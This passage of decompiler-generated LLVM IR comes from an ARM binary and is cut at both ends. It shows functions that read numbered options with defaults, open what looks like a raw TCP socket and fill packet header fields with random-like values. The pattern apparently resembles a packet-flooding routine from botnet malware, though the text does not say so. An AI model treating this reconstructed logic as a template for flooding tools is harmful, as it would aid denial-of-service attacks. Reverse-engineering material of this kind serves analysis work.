  %v1_b25c = phi i32 [ %v1_b3a8, %dec_label_pc_b388 ], [ %v1_b250, %dec_label_pc_b24c ]
  store i32 %v3_afdc, i32* %r1.global-to-local, align 4
  %v9_b25c = icmp eq i32 %v3_afdc, %v1_b25c
  store i1 %v9_b25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b25c, label %dec_label_pc_b3c4, label %dec_label_pc_b264

dec_label_pc_b264:                                ; preds = %dec_label_pc_b3b0, %dec_label_pc_b258
  store i32 %v1_afe0, i32* %r2.global-to-local, align 4
  store i1 %v2_b3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3cc, label %dec_label_pc_b3e0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_b264
  %v1_b26c = load i32, i32* @r5, align 4
  %v2_b26c = add i32 %v1_b26c, 16
  %v3_b26c = inttoptr i32 %v2_b26c to i32*
  %v4_b26c = load i32, i32* %v3_b26c, align 4
  store i32 %v4_b26c, i32* %r3.global-to-local, align 4
  %v2_b270 = load i32, i32* @r6, align 4
  %v3_b270 = add i32 %v2_b270, 16
  %v4_b270 = inttoptr i32 %v3_b270 to i32*
  store i32 %v4_b26c, i32* %v4_b270, align 4
  br label %dec_label_pc_b278

dec_label_pc_b278:                                ; preds = %bb52, %.thread4
  store i32 %v1_af48, i32* %r3.global-to-local, align 4
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3e8, label %dec_label_pc_b284, label %dec_label_pc_b3f4

dec_label_pc_b284:                                ; preds = %dec_label_pc_b278, %dec_label_pc_b3e0, %dec_label_pc_b3f4
  %v2_b288 = load i32, i32* @r5, align 4
  %v3_b288 = add i32 %v2_b288, 10
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 0, i16* %v4_b288, align 2
  %v0_b28c = load i32, i32* @r5, align 4
  store i32 %v0_b28c, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b294 = call i32 @function_dadc(i32 %v0_b28c, i32 20)
  %v3_b294 = trunc i32 %v2_b294 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b29c = load i32, i32* @r5, align 4
  %v4_b29c = add i32 %v3_b29c, 10
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v3_b294, i16* %v5_b29c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b2a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2a4 = trunc i32 %v0_b2a4 to i16
  %v2_b2a4 = load i32, i32* @r6, align 4
  %v3_b2a4 = add i32 %v2_b2a4, 10
  %v4_b2a4 = inttoptr i32 %v3_b2a4 to i16*
  store i16 %v1_b2a4, i16* %v4_b2a4, align 2
  %v0_b2a8 = load i32, i32* @r6, align 4
  store i32 %v0_b2a8, i32* @r0, align 4
  %v2_b2ac = call i32 @function_dadc(i32 %v0_b2a8, i32 20)
  %v3_b2ac = trunc i32 %v2_b2ac to i16
  %v3_b2b0 = load i32, i32* @r6, align 4
  %v4_b2b0 = add i32 %v3_b2b0, 10
  %v5_b2b0 = inttoptr i32 %v4_b2b0 to i16*
  store i16 %v3_b2ac, i16* %v5_b2b0, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2b8 = load i32, i32* @r7, align 4
  %v3_b2b8 = add i32 %v2_b2b8, 6
  %v4_b2b8 = inttoptr i32 %v3_b2b8 to i16*
  store i16 0, i16* %v4_b2b8, align 2
  %v0_b2bc = load i32, i32* @r7, align 4
  store i32 %v0_b2bc, i32* @r1, align 4
  %v1_b2c0 = add i32 %v0_b2bc, 4
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i16*
  %v3_b2c0 = load i16, i16* %v2_b2c0, align 2
  %v4_b2c0 = zext i16 %v3_b2c0 to i32
  store i32 %v4_b2c0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r3.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r6, align 4
  %v4_b2cc = call i32 @function_db2c(i32 %v0_b2c8, i32 %v0_b2bc, i32 %v4_b2c0, i32 %stack_var_-108.0.ph)
  %v5_b2cc = trunc i32 %v4_b2cc to i16
  %v3_b2d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2d0, i32* %r2.global-to-local, align 4
  %v3_b2d4 = mul i32 %v3_b2d0, 32
  store i32 %v3_b2d4, i32* %r3.global-to-local, align 4
  %v0_b2d8 = load i32, i32* @r5, align 4
  %v1_b2d8 = add i32 %v0_b2d8, 16
  %v2_b2d8 = inttoptr i32 %v1_b2d8 to i32*
  %v3_b2d8 = load i32, i32* %v2_b2d8, align 4
  %v5_b2dc = mul i32 %v3_b2d0, 24
  store i32 %v5_b2dc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = load i32, i32* @sl, align 4
  %v2_b2e0 = add i32 %v1_b2e0, %v5_b2dc
  store i32 %v2_b2e0, i32* @lr, align 4
  %v2_b2e4 = add i32 %v2_b2e0, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v3_b2d8, i32* %v3_b2e4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b2f0 = load i32, i32* @r7, align 4
  %v4_b2f0 = add i32 %v3_b2f0, 6
  %v5_b2f0 = inttoptr i32 %v4_b2f0 to i16*
  store i16 %v5_b2cc, i16* %v5_b2f0, align 2
  %v0_b2f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v0_b2f8 to i16
  %v2_b2f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_b2f8 = load i32, i32* @sl, align 4
  %v4_b2f8 = add i32 %v3_b2f8, %v2_b2f8
  %v5_b2f8 = inttoptr i32 %v4_b2f8 to i16*
  store i16 %v1_b2f8, i16* %v5_b2f8, align 2
  %v0_b2fc = load i32, i32* %r2.global-to-local, align 4
  %v1_b2fc = trunc i32 %v0_b2fc to i16
  %v2_b2fc = load i32, i32* @lr, align 4
  %v3_b2fc = add i32 %v2_b2fc, 2
  %v4_b2fc = inttoptr i32 %v3_b2fc to i16*
  store i16 %v1_b2fc, i16* %v4_b2fc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b304 = load i32, i32* @r5, align 4
  store i32 %v0_b304, i32* @r1, align 4
  store i32 %v3_af90, i32* @r0, align 4
  %v0_b30c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b30c, i32* @r2, align 4
  %v0_b318 = call i32 @function_14ae4()
  %v3_b31c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b31c, i32* %r3.global-to-local, align 4
  %v1_b320 = add i32 %v3_b31c, 1
  %v1_b324 = load i32, i32* @r8, align 4
  %v9_b324 = icmp eq i32 %v1_b320, %v1_b324
  store i1 %v9_b324, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b320, i32* %stack_var_-44, align 4
  %v6_b32c = icmp slt i32 %v1_b320, %v1_b324
  br i1 %v6_b32c, label %dec_label_pc_b208, label %dec_label_pc_b1f4

dec_label_pc_b334:                                ; preds = %dec_label_pc_b208
  %v1_b334 = add i32 %v2_b210, 16
  %v2_b334 = inttoptr i32 %v1_b334 to i32*
  %v3_b334 = load i32, i32* %v2_b334, align 4
  %v1_b338 = call i32 @function_14a1c(i32 %v3_b334)
  store i32 %v1_b338, i32* %r4.global-to-local, align 4
  %v0_b340 = call i32 @function_f570()
  %v3_b344 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b344, i32* %r2.global-to-local, align 4
  %v5_b34c = mul i32 %v3_b344, 24
  %v1_b350 = load i32, i32* @sl, align 4
  %v2_b350 = add i32 %v1_b350, %v5_b34c
  store i32 %v2_b350, i32* %r3.global-to-local, align 4
  %v1_b354 = add i32 %v2_b350, 20
  %v2_b354 = inttoptr i32 %v1_b354 to i8*
  %v3_b354 = load i8, i8* %v2_b354, align 1
  %v4_b354 = zext i8 %v3_b354 to i32
  store i32 %v4_b354, i32* %r2.global-to-local, align 4
  %v0_b358 = load i32, i32* %r4.global-to-local, align 4
  %v7_b358 = lshr i32 %v0_b340, %v4_b354
  %v8_b358 = add i32 %v7_b358, %v0_b358
  %v1_b35c = call i32 @function_14874(i32 %v8_b358)
  store i32 %v5_af7c, i32* %r2.global-to-local, align 4
  store i1 %v8_b364, i1* %cpsr_z.global-to-local, align 1
  %v1_b368 = load i32, i32* @r5, align 4
  %v2_b368 = add i32 %v1_b368, 16
  %v3_b368 = inttoptr i32 %v2_b368 to i32*
  store i32 %v1_b35c, i32* %v3_b368, align 4
  br i1 %v3_b364, label %dec_label_pc_b370, label %dec_label_pc_b23c

dec_label_pc_b370:                                ; preds = %dec_label_pc_b334, %dec_label_pc_b230
  %v0_b370 = call i32 @function_f570()
  store i32 65535, i32* @r4, align 4
  %v0_b37c = load i32, i32* @sb, align 4
  %v9_b37c = icmp eq i32 %v0_b37c, 65535
  store i1 %v9_b37c, i1* %cpsr_z.global-to-local, align 1
  %v1_b380 = load i32, i32* @r5, align 4
  %v2_b380 = add i32 %v1_b380, 12
  %v3_b380 = inttoptr i32 %v2_b380 to i32*
  store i32 %v0_b370, i32* %v3_b380, align 4
  br i1 %v9_b37c, label %dec_label_pc_b388, label %dec_label_pc_b370.dec_label_pc_b24c_crit_edge

dec_label_pc_b370.dec_label_pc_b24c_crit_edge:    ; preds = %dec_label_pc_b370
  %v1_b250.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b24c

dec_label_pc_b388:                                ; preds = %dec_label_pc_b370, %dec_label_pc_b23c
  %v0_b388 = call i32 @function_f570()
  %v3_b390 = urem i32 %v0_b388, 65536
  %v1_b398 = sub nsw i32 999, %v3_b390
  store i32 %v1_b398, i32* %r3.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b388 to i16
  %v2_b39c = load i32, i32* @r5, align 4
  %v3_b39c = add i32 %v2_b39c, 4
  %v4_b39c = inttoptr i32 %v3_b39c to i16*
  store i16 %v1_b39c, i16* %v4_b39c, align 2
  %v0_b3a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i16
  %v2_b3a0 = load i32, i32* @r6, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 4
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i16*
  store i16 %v1_b3a0, i16* %v4_b3a0, align 2
  store i32 %v3_afd8, i32* %r3.global-to-local, align 4
  %v1_b3a8 = load i32, i32* @r4, align 4
  %v9_b3a8 = icmp eq i32 %v3_afd8, %v1_b3a8
  store i1 %v9_b3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b3a8, label %dec_label_pc_b3b0, label %dec_label_pc_b258

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b388, %dec_label_pc_b24c
  %v0_b3b0 = call i32 @function_f570()
  %v1_b3b0 = trunc i32 %v0_b3b0 to i16
  store i32 %v3_afdc, i32* %r1.global-to-local, align 4
  %v1_b3b8 = load i32, i32* @r4, align 4
  %v9_b3b8 = icmp eq i32 %v3_afdc, %v1_b3b8
  store i1 %v9_b3b8, i1* %cpsr_z.global-to-local, align 1
  %v3_b3bc = load i32, i32* @r5, align 4
  %v4_b3bc = add i32 %v3_b3bc, 44
  %v5_b3bc = inttoptr i32 %v4_b3bc to i16*
  store i16 %v1_b3b0, i16* %v5_b3bc, align 2
  br i1 %v9_b3b8, label %dec_label_pc_b3c4, label %dec_label_pc_b264

dec_label_pc_b3c4:                                ; preds = %dec_label_pc_b3b0, %dec_label_pc_b258
  %v0_b3c4 = call i32 @function_f570()
  %v1_b3c4 = trunc i32 %v0_b3c4 to i16
  store i32 %v1_afe0, i32* %r2.global-to-local, align 4
  store i1 %v2_b3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3cc, label %.thread18, label %bb52

.thread18:                                        ; preds = %dec_label_pc_b3c4
  %v3_b3d419 = load i32, i32* @r7, align 4
  %v4_b3d420 = add i32 %v3_b3d419, 2
  %v5_b3d421 = inttoptr i32 %v4_b3d420 to i16*
  store i16 %v1_b3c4, i16* %v5_b3d421, align 2
  br label %dec_label_pc_b3e0

bb52:                                             ; preds = %dec_label_pc_b3c4
  %v1_b3d0 = load i32, i32* @r5, align 4
  %v2_b3d0 = add i32 %v1_b3d0, 16
  %v3_b3d0 = inttoptr i32 %v2_b3d0 to i32*
  %v4_b3d0 = load i32, i32* %v3_b3d0, align 4
  store i32 %v4_b3d0, i32* %r3.global-to-local, align 4
  %v3_b3d4 = load i32, i32* @r7, align 4
  %v4_b3d4 = add i32 %v3_b3d4, 2
  %v5_b3d4 = inttoptr i32 %v4_b3d4 to i16*
  store i16 %v1_b3c4, i16* %v5_b3d4, align 2
  %v1_b3d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_b3d8 = load i32, i32* @r6, align 4
  %v3_b3d8 = add i32 %v2_b3d8, 16
  %v4_b3d8 = inttoptr i32 %v3_b3d8 to i32*
  store i32 %v1_b3d8, i32* %v4_b3d8, align 4
  br label %dec_label_pc_b278

dec_label_pc_b3e0:                                ; preds = %.thread18, %dec_label_pc_b264
  %v0_b3e0 = call i32 @function_f570()
  store i32 %v1_af48, i32* %r3.global-to-local, align 4
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  %v1_b3ec = load i32, i32* @r6, align 4
  %v2_b3ec = add i32 %v1_b3ec, 16
  %v3_b3ec = inttoptr i32 %v2_b3ec to i32*
  store i32 %v0_b3e0, i32* %v3_b3ec, align 4
  br i1 %v2_b3e8, label %dec_label_pc_b284, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b278, %dec_label_pc_b3e0
  %v0_b3f4 = load i32, i32* @r7, align 4
  %v1_b3f4 = add i32 %v0_b3f4, 8
  store i32 %v5_af28, i32* %r1.global-to-local, align 4
  %v2_b3fc = inttoptr i32 %v1_b3f4 to i16*
  %v3_b3fc = call i32 @function_f770(i16* %v2_b3fc, i32 %v5_af28)
  br label %dec_label_pc_b284

dec_label_pc_b404:                                ; preds = %dec_label_pc_afc8
  store i32 %v5_af28, i32* %r3.global-to-local, align 4
  %v1_b40c = add i32 %v5_af28, 8
  store i32 %v1_b40c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b1f4.preheader

; uselistorder directives
  uselistorder i32 %v1_b40c, { 1, 0 }
  uselistorder i16 %v1_b3c4, { 1, 0 }
  uselistorder i32 %v1_b3a8, { 1, 0 }
  uselistorder i32 %v0_b388, { 1, 0 }
  uselistorder i32 %v1_b324, { 1, 2, 0 }
  uselistorder i32 %v1_b320, { 2, 0, 3, 1 }
  uselistorder i32 %v3_b2d0, { 1, 0, 2 }
  uselistorder i32 %v7_b21c, { 1, 0, 2 }
  uselistorder i1 %v2_b3e8, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b3cc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b19c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_b0d0, { 1, 0 }
  uselistorder i32 %v4_b18c, { 1, 0 }
  uselistorder i1 %v2_b190, { 1, 0 }
  uselistorder i32 %v4_b16c, { 1, 0 }
  uselistorder i32 %v3_b020, { 1, 0 }
  uselistorder i32 %v3_b01c, { 1, 0 }
  uselistorder i32 %v3_b008, { 2, 1, 0 }
  uselistorder i32 %v3_afe8, { 1, 0 }
  uselistorder i32 %v1_afe0, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_afd0, { 1, 0 }
  uselistorder i1 %v7_afc0, { 1, 0 }
  uselistorder i1 %v7_af94, { 1, 0 }
  uselistorder i32 %v3_af90, { 5, 1, 3, 4, 2, 0, 6 }
  uselistorder i32 %v5_af7c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_af48, { 1, 0, 2 }
  uselistorder i32 %v5_af28, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_aedc, { 1, 0, 2 }
  uselistorder i8 %v5_ae94, { 2, 0, 1 }
  uselistorder i32 %v2_ae5c, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 15, 3, 9, 10, 11, 12, 13, 14, 16, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 31, 32, 33, 22, 23, 24, 26, 25, 27, 28, 29, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 15, 16, 17, 18, 19, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 10, 11, 12, 15, 16, 17, 19, 18, 20, 21, 23, 22, 24, 25, 27, 26, 29, 28, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_b284, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b1d4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_b0c8, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
}

define i32 @function_b420(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b420:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp60 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b420 = load i32, i32* @r4, align 4
  %v6_b420 = load i32, i32* @r5, align 4
  %v18_b420 = load i32, i32* @sb, align 4
  %v27_b420 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b43c = call i32 @function_13258(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_b43c, i32* @r8, align 4
  %v0_b448 = load i32, i32* @r6, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v2_b44c = call i32 @function_13258(i32 %v0_b448, i32 4)
  %v0_b450 = load i32, i32* @r5, align 4
  store i32 %v0_b450, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b460 = load i32, i32* @r4, align 4
  store i32 %v0_b460, i32* %r0.global-to-local, align 4
  %v5_b464 = inttoptr i32 %v0_b450 to i32*
  %v6_b464 = call i32 @function_a430(i32 %v0_b460, i32* %v5_b464, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  %v0_b480 = load i32, i32* @r4, align 4
  store i32 %v0_b480, i32* %r0.global-to-local, align 4
  %v6_b488 = inttoptr i32 %v0_b47c to i32*
  %v7_b488 = call i32 @function_a430(i32 %v0_b480, i32* %v6_b488, i32 3, i32 65535)
  %v0_b48c = load i32, i32* @r5, align 4
  store i32 %v0_b48c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b488, i32* @r7, align 4
  %v0_b49c = load i32, i32* @r4, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v4_b4a0 = inttoptr i32 %v0_b48c to i32*
  %v5_b4a0 = call i32 @function_a430(i32 %v0_b49c, i32* %v4_b4a0, i32 4, i32 64)
  %v0_b4ac = load i32, i32* @r5, align 4
  store i32 %v0_b4ac, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4b8 = load i32, i32* @r4, align 4
  store i32 %v0_b4b8, i32* %r0.global-to-local, align 4
  %v6_b4c0 = inttoptr i32 %v0_b4ac to i32*
  %v7_b4c0 = call i32 @function_a430(i32 %v0_b4b8, i32* %v6_b4c0, i32 5, i32 1)
  %v1_b4cc = urem i32 %v7_b4c0, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @r5, align 4
  store i32 %v0_b4d4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b4dc = load i32, i32* @r4, align 4
  store i32 %v0_b4dc, i32* %r0.global-to-local, align 4
  %v5_b4e4 = inttoptr i32 %v0_b4d4 to i32*
  %v6_b4e4 = call i32 @function_a430(i32 %v0_b4dc, i32* %v5_b4e4, i32 7, i32 65535)
  %v3_b4ec = urem i32 %v6_b4e4, 65536
  %v0_b4f0 = load i32, i32* @r5, align 4
  store i32 %v0_b4f0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r4, align 4
  store i32 %v0_b4fc, i32* %r0.global-to-local, align 4
  %v5_b504 = inttoptr i32 %v0_b4f0 to i32*
  %v6_b504 = call i32 @function_a430(i32 %v0_b4fc, i32* %v5_b504, i32 11, i32 0)
  %v1_b50c = urem i32 %v6_b504, 256
  %v0_b510 = load i32, i32* @r5, align 4
  store i32 %v0_b510, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b51c = load i32, i32* @r4, align 4
  store i32 %v0_b51c, i32* %r0.global-to-local, align 4
  %v5_b524 = inttoptr i32 %v0_b510 to i32*
  %v6_b524 = call i32 @function_a430(i32 %v0_b51c, i32* %v5_b524, i32 12, i32 1)
  %v0_b530 = load i32, i32* @r5, align 4
  store i32 %v0_b530, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b53c = load i32, i32* @r4, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v5_b544 = inttoptr i32 %v0_b530 to i32*
  %v6_b544 = call i32 @function_a430(i32 %v0_b53c, i32* %v5_b544, i32 13, i32 1)
  %v1_b54c = urem i32 %v6_b544, 256
  %v0_b550 = load i32, i32* @r5, align 4
  store i32 %v0_b550, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b55c = load i32, i32* @r4, align 4
  store i32 %v0_b55c, i32* %r0.global-to-local, align 4
  %v5_b564 = inttoptr i32 %v0_b550 to i32*
  %v6_b564 = call i32 @function_a430(i32 %v0_b55c, i32* %v5_b564, i32 14, i32 0)
  %v0_b570 = load i32, i32* @r5, align 4
  store i32 %v0_b570, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b57c = load i32, i32* @r4, align 4
  store i32 %v0_b57c, i32* %r0.global-to-local, align 4
  %v5_b584 = inttoptr i32 %v0_b570 to i32*
  %v6_b584 = call i32 @function_a430(i32 %v0_b57c, i32* %v5_b584, i32 15, i32 0)
  %v1_b58c = urem i32 %v6_b584, 256
  %v0_b590 = load i32, i32* @r5, align 4
  store i32 %v0_b590, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b59c = load i32, i32* @r4, align 4
  store i32 %v0_b59c, i32* %r0.global-to-local, align 4
  %v5_b5a4 = inttoptr i32 %v0_b590 to i32*
  %v6_b5a4 = call i32 @function_a430(i32 %v0_b59c, i32* %v5_b5a4, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b5b8 = load i32, i32* @r5, align 4
  store i32 %v0_b5b8, i32* %r1.global-to-local, align 4
  %v0_b5bc = load i32, i32* @r4, align 4
  store i32 %v0_b5bc, i32* %r0.global-to-local, align 4
  %v5_b5c4 = inttoptr i32 %v0_b5b8 to i32*
  %v6_b5c4 = call i32 @function_a430(i32 %v0_b5bc, i32* %v5_b5c4, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b5d4 = load i32, i32* @r5, align 4
  store i32 %v0_b5d4, i32* %r1.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @r4, align 4
  store i32 %v0_b5d8, i32* %r0.global-to-local, align 4
  %v4_b5dc = inttoptr i32 %v0_b5d4 to i32*
  %v5_b5dc = call i32 @function_a430(i32 %v0_b5d8, i32* %v4_b5dc, i32 1, i32 1)
  %v1_b5e4 = urem i32 %v5_b5dc, 256
  store i32 %v1_b5e4, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b5f8 = call i32 @function_14ba0(i32 2, i32 3, i32 6)
  store i32 %v3_b5f8, i32* @r0, align 4
  %v7_b5fc = icmp eq i32 %v3_b5f8, -1
  store i1 %v7_b5fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b5f8, i32* @fp, align 4
  br i1 %v7_b5fc, label %dec_label_pc_b7f4, label %dec_label_pc_b608

dec_label_pc_b608:                                ; preds = %dec_label_pc_b420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b610 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b610, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_b624 = call i32 @function_14b30(i32 %v3_b5f8, i32 0, i32 3, i32 %v6_b610, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b624, i32* %r0.global-to-local, align 4
  %v7_b628 = icmp eq i32 %v5_b624, -1
  store i1 %v7_b628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b628, label %dec_label_pc_b7ec, label %dec_label_pc_b630

dec_label_pc_b630:                                ; preds = %dec_label_pc_b608
  %v0_b630 = load i32, i32* @r7, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b638 = urem i32 %v0_b630, 65536
  store i32 %v3_b638, i32* %r2.global-to-local, align 4
  %v0_b63c = load i32, i32* @r6, align 4
  %v2_b63c = icmp eq i32 %v0_b63c, 0
  store i1 %v2_b63c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b63c, label %dec_label_pc_ba4c, label %dec_label_pc_b64c

dec_label_pc_b64c:                                ; preds = %dec_label_pc_b630
  %v2_b64c = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_b64c, i32* @sb, align 4
  %v2_b694 = ptrtoint i32* %stack_var_-152 to i32
  %v3_b83c = icmp eq i32 %v3_b4ec, 65535
  %v2_b6e0 = ptrtoint i32* %stack_var_-64 to i32
  %v4_b788 = zext i8 %tmp to i32
  %v1_b78c = and i32 %v4_b788, 18
  %v2_b790 = icmp eq i32 %v1_b78c, 18
  %sext = mul i32 %v6_b464, 16777216
  %v4_b8ec = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v5_b4a0, 16777216
  %v4_b910 = sdiv i32 %sext8, 16777216
  %v2_b914 = icmp eq i32 %v1_b4cc, 0
  %v3_b774 = sext i16 %tmp60 to i32
  %v1_b798 = and i32 %v4_b788, 5
  %v2_b798 = icmp eq i32 %v1_b798, 0
  %v1_b8a4 = add i32 %v6_b5c4, 40
  %v1_b8f4 = trunc i32 %v4_b8ec to i8
  %v1_b9b0 = urem i32 %v6_b504, 2
  %tmp87 = sub nsw i32 0, %v1_b9b0
  %v4_b9b8 = and i32 %tmp87, 32
  %v1_b9c8 = urem i32 %v6_b524, 2
  %tmp88 = sub nsw i32 0, %v1_b9c8
  %v4_b9d0 = and i32 %tmp88, 16
  %v1_b9e0 = urem i32 %v6_b544, 2
  %tmp89 = sub nsw i32 0, %v1_b9e0
  %v4_b9e8 = and i32 %tmp89, 8
  %v1_b9f8 = urem i32 %v6_b564, 2
